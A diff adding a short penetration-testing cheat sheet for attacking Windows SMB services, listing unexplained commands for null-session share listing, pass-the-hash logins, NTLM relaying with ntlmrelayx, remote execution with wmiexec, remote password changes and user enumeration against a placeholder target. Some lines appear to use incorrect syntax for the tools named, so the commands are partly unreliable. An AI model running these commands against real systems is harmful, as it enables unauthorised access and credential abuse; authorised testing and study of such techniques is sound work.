@@ -1,0 +1,31 @@
+steps.SMB
+
+
+
+
+
+# smbclient
+smbclient -L //$targetIP -N -I 
+smbclient //$targetIP/share -U username%password
+smbclient //$targetIP/share -U username%aad3b435b51404eeaad3b435b51404ee:ntlmhash
+
+# smbserver
+smbserver.py share /path/to/share
+
+# ntlmrelayx
+ntlmrelayx.py -t smb://$targetIP
+
+# wmiexec
+wmiexec.py //$targetIP -U username%password
+wmiexec.py //$targetIP -k -no-pass
+
+# mssqlclient
+mssqlclient.py //$targetIP -windows-auth
+
+# smbpasswd
+smbpasswd.py -r //$targetIP -U username%password NewPassword
+
+# samrdump.py
+samrdump.py -r //$targetIP -U username%password
+
+
